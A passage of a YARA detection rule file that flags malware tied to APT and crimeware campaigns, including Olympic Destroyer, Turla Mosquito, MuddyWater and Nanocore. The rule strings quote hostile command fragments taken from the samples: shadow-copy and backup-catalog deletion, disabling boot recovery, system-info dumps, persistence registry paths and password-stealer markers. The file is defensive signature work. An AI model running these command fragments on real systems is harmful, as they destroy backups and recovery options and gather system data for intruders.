ascii\n      $s4 = \"%hc%hc==\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"2f3b3df466e24e0792e0e90d668856bc\" or pe.exports ( \"dll_u\" ) or ( $a1 and 2 of ( $s* ) ) )\n}\n\nrule Slingshot_APT_Malware_4_RID2FCB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:12:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"38c4f5320b03cbaf5c14997ea321507730a8c16906e5906cbf458139c91d5945\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Ss -a 4104 -s 257092 -o 8 -l 406016 -r 4096 -z 315440\" fullword wide\n      $s1 = \"Slingshot\" fullword ascii\n      $s2 = \"\\\\\\\\?\\\\e:\\\\$Recycle.Bin\\\\\" wide\n      $s3 = \"LineRecs.reloc\" fullword ascii\n      $s4 = \"EXITGNG\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( $x1 or 2 of them )\n}\n\nrule Gsecdump_password_dump_file_RID322F : DEMO FILE SUSP T1003 {\n   meta:\n      description = \"Detects a gsecdump output file\"\n      author = \"Florian Roth\"\n      reference = \"https://t.co/OLIj1yVJ4m\"\n      date = \"2018-03-06 13:54:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, SUSP, T1003\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"Administrator(current):500:\" ascii\n   condition: \n      uint32be ( 0 ) == 0x41646d69 and filesize < 3000 and $x1 at 0\n}\n\nrule TSCookie_RAT_RID2B58 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects TSCookie RAT\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.jpcert.or.jp/2018/03/malware-tscooki-7aa0.html\"\n      date = \"2018-03-06 09:02:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2bd13d63797864a70b775bd1994016f5052dc8fd1fd83ce1c13234b5d304330d\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $x1 = \"[-] DecryptPassword_Outlook failed(err=%d)\" fullword ascii\n      $x2 = \"----------------------- Firefox Passwords ------------------\" fullword ascii\n      $x3 = \"--------------- Outlook Passwords ------------------\" fullword ascii\n      $x4 = \"----------------------- IE Passwords ------------------\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( ( pe.exports ( \"DoWork\" ) and pe.exports ( \"PrintF\" ) ) or 1 of them )\n}\n\nrule CrimsonRAT_Mar18_1_RID2D4B : DEMO EXE FILE MAL T1082 T1113 {\n   meta:\n      description = \"Detects CrimsonRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-03-06 10:25:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"acf2e8013b6fafcf436d5a05049896504ffa2e982bca05155d19981d1931c611\"\n      hash2 = \"7ca6e5ef1d346ec35993c910128a3526b098a07445131784a9358bf5679e3975\"\n      hash3 = \"be4264973de9886caedae1cb707586588d0da85ac7a2ad277db4258033ea12a8\"\n      tags = \"DEMO, EXE, FILE, MAL, T1082, T1113\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run|\" wide\n      $x2 = \"\\\\Release\\\\RTLBot.pdb\" ascii\n      $x3 = \"cmd.exe/c systeminfo >> 1.txt\" fullword wide\n      $x4 = \"/online >> Get online target with important info\" fullword wide\n      $x5 = \"/screen >> ScreenShot from target PC\" fullword wide\n      $x6 = \"/restart >> Restart Target PC\" fullword wide\n      $x7 = \"/log_key >> Get log key file\" fullword wide\n      $a1 = \"get_ShiftKey\" fullword ascii\n      $a2 = \"get_ControlKey\" fullword ascii\n      $a3 = \"get_AltKey\" fullword ascii\n      $a4 = \"get_MineInterval\" fullword ascii\n      $fp1 = \"Copyright Software Secure\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or all of ( $a* ) ) and not 1 of ( $fp* )\n}\n\nrule HoneyBee_Dropper_MalDoc_RID2FEA : APT DEMO FILE G0072 T1047 T1057 T1569_002 {\n   meta:\n      description = \"Detects samples from Operation Honeybee\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mcafee.com:443/blogs/\"\n      date = \"2018-03-03 12:17:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"86981680172bbf0865e7693fe5a2bbe9b3ba12b3f1a1536ef67915daab78004c\"\n      hash2 = \"0d4352322160339f87be70c2f3fe096500cfcdc95a8dea975fdfc457bd347c44\"\n      tags = \"APT, DEMO, FILE, G0072, T1047, T1057, T1569_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd /c expand %TEMP%\\\\setup.cab -F:* %SystemRoot%\\\\System32\" \n      $x2 = \"del /f /q %TEMP%\\\\setup.cab && cliconfg.exe\" \n      $s1 = \"SELECT * FROM Win32_Processor\" fullword ascii\n      $s2 = \"\\\"cmd /c `wusa \" fullword ascii\n      $s3 = \"sTempPathP\" fullword ascii\n      $s4 = \"sTempFile\" fullword ascii\n      $s5 = \"GetObjectz\" fullword ascii\n      $s6 = \"\\\\setup.cab\" ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 400KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule OpHoneybee_Malware_1_RID2EB7 : APT DEMO EXE FILE G0072 T1082 T1569_002 {\n   meta:\n      description = \"Detects malware from Operation Honeybee\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mcafee.com:443/blogs/\"\n      date = \"2018-03-03 11:26:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"d31fe5cfa884e04ee26f323b8d104dcaa91146f5c7c216212fd3053afaade80f\"\n      hash2 = \"fc2bcd38659ae83fd25b4f7091412ae9ba011612fa4dcc3ef665b2cae2a1d74f\"\n      hash3 = \"2c5e5c86ca4fa172341c6bcbaa50984fb168d650ae9a33f2c6e6dccc1d57b369\"\n      tags = \"APT, DEMO, EXE, FILE, G0072, T1082, T1569_002\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"cmd /c taskkill /im cliconfg.exe /f /t && del /f /q\" fullword ascii\n      $x2 = \"\\\\FTPCom_vs10\\\\Release\\\\Engine.pdb\" ascii\n      $x3 = \"KXU/yP=B29tLzidqNRuf-SbVInw0oCrmWZk6OpFc7A5GTD1QxaJ3H8h4jMeEsYglv\" fullword ascii\n      $x4 = \"D:\\\\Task\\\\MiMul\\\\\" ascii\n      $s1 = \"[DLL_PROCESS_ATTACH]\" fullword ascii\n      $s2 = \"cmd /c systeminfo >%s\" fullword ascii\n      $s3 = \"post.txt\" fullword ascii\n      $s4 = \"\\\\temp.ini\" ascii\n      $s5 = \"[GetFTPAccountInfo_10001712]\" fullword ascii\n      $s6 = \"ComSysAppMutex\" fullword ascii\n      $s7 = \"From %s (%02d-%02d %02d-%02d-%02d).txt\" fullword ascii\n      $s8 = \"%s %s %c%s%c\" fullword ascii\n      $s9 = \"TO EVERYONE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"e14b59a79999cc0bc589a4cb5994692a\" or pe.imphash ( ) == \"64400f452e2f60305c341e08f217b02c\" or 1 of ( $x* ) or 3 of them )\n}\n\nrule OpHoneybee_MaoCheng_Dropper_RID319B : APT DEMO EXE FILE G0072 T1569_002 {\n   meta:\n      description = \"Detects MaoCheng dropper from Operation Honeybee\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mcafee.com:443/blogs/\"\n      date = \"2018-03-03 13:29:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"35904f482d37f5ce6034d6042bae207418e450f4\"\n      tags = \"APT, DEMO, EXE, FILE, G0072, T1569_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\MaoCheng\\\\Release\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them\n}\n\nrule Sofacy_Trojan_Loader_Feb18_1_RID315E : DEMO EXE FILE G0007 MAL RUSSIA {\n   meta:\n      description = \"Sofacy Activity Feb 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.reverse.it/sample/e3399d4802f9e6d6d539e3ae57e7ea9a54610a7c4155a6541df8e94d67af086e?environmentId=100\"\n      date = \"2018-03-01 13:19:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"335565711db93cd02d948f472c51598be4d62d60f70f25a20449c07eae36c8c5\"\n      tags = \"DEMO, EXE, FILE, G0007, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"%appdata%\\\\nad.dll\" fullword wide\n      $s3 = \"%appdata%\\\\nad.bat\" fullword wide\n      $s1 = \"apds.dll\" fullword ascii\n      $s2 = \"nad.dll\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"a2d1be6502b4b3c28959a4fb0196ea45\" or pe.exports ( \"VidBitRpl\" ) or 1 of ( $x* ) or 2 of them )\n}\n\nrule MuddyWater_Mal_Doc_Feb18_1_RID306A : DEMO FILE G0069 MAL {\n   meta:\n      description = \"Detects malicious document used by MuddyWater\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - TI2T\"\n      date = \"2018-02-26 12:38:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c\"\n      tags = \"DEMO, FILE, G0069, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"aWV4KFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmco\" ascii\n      $x2 = \"U1FCdUFIWUFid0JyQUdVQUxRQkZBSGdBY0FCeUFHVUFjd0J6QUdrQWJ3QnVBQ0FBS\" \n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 3000KB and 1 of them\n}\n\nrule MuddyWater_Mal_Doc_Feb18_2_RID306B : DEMO FILE G0069 MAL {\n   meta:\n      description = \"Detects malicious document used by MuddyWater\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - TI2T\"\n      date = \"2018-02-26 12:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c\"\n      hash2 = \"366d8b84a43a528e6aaf9ecfc38980b148f983967803914471ccf011b9bb0832\"\n      tags = \"DEMO, FILE, G0069, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"*\\\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\\\Windows\\\\System32\\\\stdole2.tlb#OLE Automation\" fullword wide\n      $s2 = \"*\\\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\OFFICE16\\\\MSO.DLL#Microsoft \" wide\n      $s3 = \"*\\\\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\\\\Program Files\\\\Microsoft Office\\\\Office16\\\\MSWORD.OLB#Microsoft Word 16.0 O\" wide\n      $s4 = \"scripting.filesystemobject$\" fullword ascii\n      $s5 = \"ID=\\\"{00000000-0000-0000-0000-000000000000}\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 6000KB and all of them\n}\n\nrule IceFog_Malware_Feb18_1_RID2ECB : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects IceFog malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ClearskySec/status/968104465818669057\"\n      date = \"2018-02-26 11:29:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"480373cffc4e60aa5be2954a156e37d689b92e6e33969958230f2ce59d30b9ec\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd /c %c%s%c\" fullword ascii\n      $s2 = \"temp.bat\" fullword ascii\n      $s3 = \"c:\\\\windows\\\\debug\\\\wia\\\\help\" fullword wide\n      $s4 = \"/getorder.aspx?hostname=\" fullword wide\n      $s5 = \"\\\\filecfg_temp.dat\" wide\n      $s6 = \"Unknown operating system \" fullword wide\n      $s7 = \"kastygost.compress.to\" fullword wide\n      $s8 = \"/downloads/\" wide\n      $s9 = \"\\\\key.dat\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 4 of them\n}\n\nrule TurlaMosquito_Mal_1_RID2E83 : DEMO EXE FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:17:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b295032919143f5b6b3c87ad22bcf8b55ecc9244aa9f6f88fc28f36f5aa2925e\"\n      tags = \"DEMO, EXE, FILE, G0010, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"Pipetp\" fullword ascii\n      $s2 = \"EStOpnabn\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( pe.imphash ( ) == \"169d4237c79549303cca870592278f42\" or all of them )\n}\n\nrule TurlaMosquito_Mal_2_RID2E84 : DEMO EXE FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:17:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"68c6e9dea81f082601ae5afc41870cea3f71b22bfc19bcfbc61d84786e481cb4\"\n      hash2 = \"05254971fe3e1ca448844f8cfcfb2b0de27e48abd45ea2a3df897074a419a3f4\"\n      tags = \"DEMO, EXE, FILE, G0010, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \".?AVFileNameParseException@ExecuteFile@@\" fullword ascii\n      $s3 = \"no_address\" fullword wide\n      $s6 = \"SRRRQP\" fullword ascii\n      $s7 = \"QWVPQQ\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"cd918073f209c5da7a16b6c125d73746\" or all of them )\n}\n\nrule TurlaMosquito_Mal_3_RID2E85 : DEMO EXE FILE G0010 MAL RUSSIA T1047 {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"443cd03b37fca8a5df1bbaa6320649b441ca50d1c1fcc4f5a7b94b95040c73d1\"\n      tags = \"DEMO, EXE, FILE, G0010, MAL, RUSSIA, T1047\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"InstructionerDLL.dll\" fullword ascii\n      $s1 = \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\" fullword wide\n      $s2 = \"/scripts/m/query.php?id=\" fullword wide\n      $s3 = \"SELECT * FROM AntiVirusProduct\" fullword ascii\n      $s4 = \"Microsoft Update\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == \"88488fe0b8bcd6e379dea6433bb5d7d8\" or ( pe.exports ( \"InstallRoutineW\" ) and pe.exports ( \"StartRoutine\" ) ) or $x1 or 3 of them )\n}\n\nrule TurlaMosquito_Mal_4_RID2E86 : DEMO EXE FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b362b235539b762734a1833c7e6c366c1b46474f05dc17b3a631b3bff95a5eec\"\n      tags = \"DEMO, EXE, FILE, G0010, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and pe.imphash ( ) == \"17b328245e2874a76c2f46f9a92c3bad\"\n}\n\nrule TurlaMosquito_Mal_5_RID2E87 : DEMO EXE FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"26a1a42bc74e14887616f9d6048c17b1b4231466716a6426e7162426e1a08030\"\n      tags = \"DEMO, EXE, FILE, G0010, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and pe.imphash ( ) == \"ac40cf7479f53a4754ac6481a4f24e57\"\n}\n\nrule TurlaMosquito_Mal_6_RID2E88 : DEMO EXE FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects malware sample from Turla Mosquito report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n      date = \"2018-02-22 11:18:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b79cdf929d4a340bdd5f29b3aeccd3c65e39540d4529b64e50ebeacd9cdee5e9\"\n      tags = \"DEMO, EXE, FILE, G0010, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"/scripts/m/query.php?id=\" fullword wide\n      $a2 = \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\" fullword wide\n      $a3 = \"GetUserNameW fails\" fullword wide\n      $s1 = \"QVSWQQ\" fullword ascii\n      $s2 = \"SRRRQP\" fullword ascii\n      $s3 = \"QSVVQQ\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 2 of ( $a* ) or 4 of them )\n}\n\nrule Nanocore_RAT_Feb18_1_RID2DF1 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Nanocore RAT\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - T2T\"\n      date = \"2018-02-19 10:53:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aa486173e9d594729dbb5626748ce10a75ee966481b68c1b4f6323c827d9658c\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"NanoCore Client.exe\" fullword ascii\n      $x2 = \"NanoCore.ClientPluginHost\" fullword ascii\n      $s1 = \"PluginCommand\" fullword ascii\n      $s2 = \"FileCommand\" fullword ascii\n      $s3 = \"PipeExists\" fullword ascii\n      $s4 = \"PipeCreated\" fullword ascii\n      $s5 = \"IClientLoggingHost\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 5 of them )\n}\n\nrule Nanocore_RAT_Feb18_2_RID2DF2 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Nanocore RAT\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - T2T\"\n      date = \"2018-02-19 10:53:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"377ef8febfd8df1a57a7966043ff0c7b8f3973c2cf666136e6c04080bbf9881a\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ResManagerRunnable\" fullword ascii\n      $s2 = \"TransformRunnable\" fullword ascii\n      $s3 = \"MethodInfoRunnable\" fullword ascii\n      $s4 = \"ResRunnable\" fullword ascii\n      $s5 = \"RunRunnable\" fullword ascii\n      $s6 = \"AsmRunnable\" fullword ascii\n      $s7 = \"ReadRunnable\" fullword ascii\n      $s8 = \"ExitRunnable\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule LokiBot_Dropper_ScanCopyPDF_Feb18_RID332E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file Scan Copy.pdf.com\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/401df4d9-098b-4fd0-86e0-7a52ce6ddbf5\"\n      date = \"2018-02-14 14:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6f8ff26a5daf47effdea5795cdadfff9265c93a0ebca0ce5a4144712f8cab5be\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Win32           Scan Copy.pdf   \" fullword wide\n      $a1 = \"C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\VB98\\\\VB6.OLB\" fullword ascii\n      $s1 = \"Compiling2.exe\" fullword wide\n      $s2 = \"Unstalled2\" fullword ascii\n      $s3 = \"Compiling.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and $x1 or ( $a1 and 1 of ( $s* ) )\n}\n\nrule LokiBot_Dropper_Packed_R11_Feb18_RID328F : DEMO FILE MAL T1027_002 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file scan copy.pdf.r11\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/401df4d9-098b-4fd0-86e0-7a52ce6ddbf5\"\n      date = \"2018-02-14 14:10:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3b248d40fd7acb839cc592def1ed7652734e0e5ef93368be3c36c042883a3029\"\n      tags = \"DEMO, FILE, MAL, T1027_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\VB98\\\\VB6.OLB\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x0000 and filesize < 2000KB and 1 of them\n}\n\nrule HawkEye_Keylogger_Feb18_1_RID302C : DEMO EXE FILE MAL T1056_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/ae2521dd-61aa-4bc7-b0d8-8c85ddcbfcc9\"\n      date = \"2018-02-12 12:28:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"bb58922ad8d4a638e9d26076183de27fb39ace68aa7f73adc0da513ab66dc6fa\"\n      tags = \"DEMO, EXE, FILE, MAL, T1056_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"UploadReportLogin.asmx\" fullword wide\n      $s2 = \"tmp.exe\" fullword wide\n      $s3 = \"%appdata%\\\\\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule Destructive_Ransomware_Gen1_RID31CB : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects destructive malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"\n      date = \"2018-02-12 13:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ae9a4e244a9b3c77d489dee8aeaf35a7c3ba31b210e76d81ef2e91790f052c85\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no\" fullword wide\n      $x2 = \"delete shadows /all /quiet\" fullword wide\n      $x3 = \"delete catalog -quiet\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule OlympicDestroyer_Gen2_RID2F5A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Olympic Destroyer malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"\n      date = \"2018-02-12 11:53:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d934cb8d0eadb93f8a57a9b8853c5db218d5db78c16a35f374e413884d915016\"\n      hash2 = \"3e27b6b287f0b9f7e85bfe18901d961110ae969d58b44af15b1d75be749022c2\"\n      hash3 = \"edb1ff2521fb4bf748111f92786d260d40407a2e8463dcd24bb09f908ee13eb9\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"cmd.exe /c (ping 0.0.0.0 > nul) && if exist %programdata%\\\\evtchk.txt\" fullword wide\n      $x2 = \"cmd.exe /c (echo strPath = Wscript.ScriptFullName & echo.Set FSO = CreateObject^(\\\"Scripting.FileSystemObject\\\"^)\" wide\n      $x3 = \"del %programdata%\\\\evtchk.txt\" fullword wide\n      $x4 = \"Pyeongchang2018.com\\\\svc_all_swd_installc\" fullword ascii\n      $s1 = \"<STARTCRED>\" fullword wide\n      $s2 = \"SELECT ds_cn FROM ds_computer\" fullword wide\n      $s3 = \"\\\\system32\\\\notepad.exe\" wide\n      $s4 = \"%s \\\\\\\\%s -u \\\"%s\\\" -p \\\"%s\\\" -accepteula -d %s %s \\\"%s\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( pe.imphash ( ) == \"fd7200dcd5c0d9d4d277a26d951210aa\" or pe.imphash ( ) == \"975087e9286238a80895b195efb3968d\" or pe.imphash ( ) == \"da1c2d7acfe54df797bfb1f470257bc3\" or 1 of ( $x* ) or 3 of them )\n}\n\nrule VBS_Obfuscated_Mal_Feb18_1_RID3039 : DEMO MAL OBFUS SCRIPT T1059 {\n   meta:\n      description = \"Detects malicious obfuscated VBS observed in February 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/gui/file/c03da12acbe7f7dfed6219f8809f377fb35b6100a0e560ac0f55313d34f0db17/detection\"\n      date = \"2018-02-12 12:30:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"06960cb721609fe5a857fe9ca3696a84baba88d06c20920370ddba1b0952a8ab\"\n      hash2 = \"c5c0e28093e133d03c3806da0061a35776eed47d351e817709d2235b95d3a036\"\n      hash3 = \"e1765a2b10e2ff10235762b9c65e9f5a4b3b47d292933f1a710e241fe0417a74\"\n      tags = \"DEMO, MAL, OBFUS, SCRIPT, T1059\"\n      minimum_yara = \"1.7\"\n      \n  